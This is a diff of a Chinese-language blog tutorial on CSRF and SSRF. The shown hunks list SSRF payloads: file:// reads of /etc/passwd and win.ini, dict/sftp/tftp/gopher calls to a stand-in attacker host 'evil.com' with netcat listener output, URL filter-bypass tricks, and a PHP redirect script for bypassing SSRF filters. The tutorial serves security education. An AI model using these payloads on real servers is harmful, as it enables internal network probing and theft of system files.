@@ -6,7 +6,7 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 @font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 5.4.2"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CSRF&amp;SSRF</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-23T12:29:29.000Z" id="date"> 2023-04-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-04-24T08:21:29.052Z" id="updated"> 2023-04-24</time></div></span></div></div><hr><div id="post-content"><span id="more"></span>
+}</style><meta name="generator" content="Hexo 5.4.2"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CSRF&amp;SSRF</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-23T12:29:29.000Z" id="date"> 2023-04-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-22T13:19:47.855Z" id="updated"> 2023-05-22</time></div></span></div></div><hr><div id="post-content"><span id="more"></span>
 
 <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><h3 id="CSRF解释"><a href="#CSRF解释" class="headerlink" title="CSRF解释"></a>CSRF解释</h3><ul>
 <li>CSRF（Cross-site Request Forgery，跨站请求伪造）是一种针对网站的恶意利用。CSRF攻击可以利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。</li>
@@ -62,64 +62,64 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <li>可以尝试从文件系统中获取文件：</li>
 </ul>
 <blockquote>
-<p><a href="http://example.com/ssrf.php?url=file:///etc/passwd">http://example.com/ssrf.php?url=file:///etc/passwd</a><br><a href="http://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+<p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code><br><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p>
 </blockquote>
 <h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><ul>
 <li>能够引用允许通过DICT协议使用的定义或单词列表：</li>
 </ul>
 <blockquote>
-<p><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p>
+<p><code>http://example.com/ssrf.php?dict://evil.com:1337/</code><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p>
 </blockquote>
 <h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><ul>
 <li>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</li>
 </ul>
 <blockquote>
-<p><a href="http://example.com/ssrf.php?url=sftp://evil.com:1337/">http://example.com/ssrf.php?url=sftp://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p>
+<p><code>http://example.com/ssrf.php?url=sftp://evil.com:1337/</code><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p>
 </blockquote>
 <h3 id="ldap-或ldaps-或ldapi"><a href="#ldap-或ldaps-或ldapi" class="headerlink" title="ldap://或ldaps://或ldapi://"></a>ldap://或ldaps://或ldapi://</h3><ul>
 <li>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</li>
 </ul>
 <blockquote>
-<p><a href="http://example.com/ssrf.php?url=ldap://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</a><br><a href="http://example.com/ssrf.php?url=ldaps://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</a><br><a href="http://example.com/ssrf.php?url=ldapi://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</a></p>
+<p><code>http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</code><br><code>http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</code><br><code>http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</code></p>
 </blockquote>
 <h3 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h3><ul>
 <li>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</li>
 </ul>
 <blockquote>
-<p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a><br>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p>
+<p><code>http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</code><br>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p>
 </blockquote>
 <h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><ul>
 <li>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</li>
 </ul>
 <blockquote>
-<p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):-<?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?><br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</p>
+<p><code>http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#39;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#39;);?&gt;</code><br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</p>
 </blockquote>
 <h2 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h2><h3 id="符号绕过"><a href="#符号绕过" class="headerlink" title="@符号绕过"></a>@符号绕过</h3><ul>
 <li>在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据</li>
 </ul>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.xxx.com@www.kxsy.work/">http://www.xxx.com@www.kxsy.work/</a></p>
+<p><code>http://www.xxx.com@www.kxsy.work/</code></p>
 </blockquote>
 <h3 id="IP地址转换"><a href="#IP地址转换" class="headerlink" title="IP地址转换"></a>IP地址转换</h3><ul>
-<li>对内网请求的IP地址进行各进制的编码<br>这个<a target="_blank" rel="noopener" href="http://mo.ab126.com/system/2859.html">网址</a>可以进行在线转换</li>
+<li>对内网请求的IP地址进行各进制的编码</li>
 </ul>
 <blockquote>
 <p>例如：127.0.0.1<br>二进制 = 1111111000000000000000000000001<br>十六进制 = 7F000001<br>十进制 = 2130706433</p>
 </blockquote>
 <h3 id="转换短地址"><a href="#转换短地址" class="headerlink" title="转换短地址"></a>转换短地址</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.985.so/">https://www.985.so/</a><br>例：<a target="_blank" rel="noopener" href="http://www.kxsy.work/">http://www.kxsy.work/</a> = <a target="_blank" rel="noopener" href="http://u6.gg/ks69x">http://u6.gg/ks69x</a></p>
+<p><code>https://www.985.so/ </code><br>例：<code>http://www.kxsy.work/ = http://u6.gg/ks69x</code></p>
 </blockquote>
 <h3 id="特殊符号替换绕过"><a href="#特殊符号替换绕过" class="headerlink" title="特殊符号替换绕过"></a>特殊符号替换绕过</h3><blockquote>
-<p>例：<br><a target="_blank" rel="noopener" href="http://www.kxsy.work/">http://www.kxsy.work/</a> = <a target="_blank" rel="noopener" href="http://www.kxsy.work/">http://www。kxsy。work/</a><br>localhost或者0.0.0.0</p>
+<p>例：<br><code>http://www.kxsy.work/ = http://www。kxsy。work/ </code><br>localhost或者0.0.0.0</p>
 </blockquote>
 <h3 id="利用句号绕过"><a href="#利用句号绕过" class="headerlink" title="利用句号绕过"></a>利用句号绕过</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://baidu.com/?url=http://192%E3%80%82168%E3%80%8210%E3%80%82150">http://baidu.com/?url=http://192。168。10。150</a></p>
+<p><code>http://baidu.com/?url=http://192。168。10。150</code></p>
 </blockquote>
 <h3 id="添加端口绕过"><a href="#添加端口绕过" class="headerlink" title="添加端口绕过"></a>添加端口绕过</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://baidu.com/?url=http://google.com:443">http://baidu.com/?url=http://google.com:443</a></p>
+<p><code>http://baidu.com/?url=http://google.com:443</code></p>
 </blockquote>
 <h3 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://baidu.com/?url=http://%5B::192.168.10.150%5D">http://baidu.com/?url=http://[::192.168.10.150]</a></p>
+<p><code>http://baidu.com/?url=http://[::192.168.10.150]</code></p>
 </blockquote>
 <h3 id="302跳转绕过"><a href="#302跳转绕过" class="headerlink" title="302跳转绕过"></a>302跳转绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span>     = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>   = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;  </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
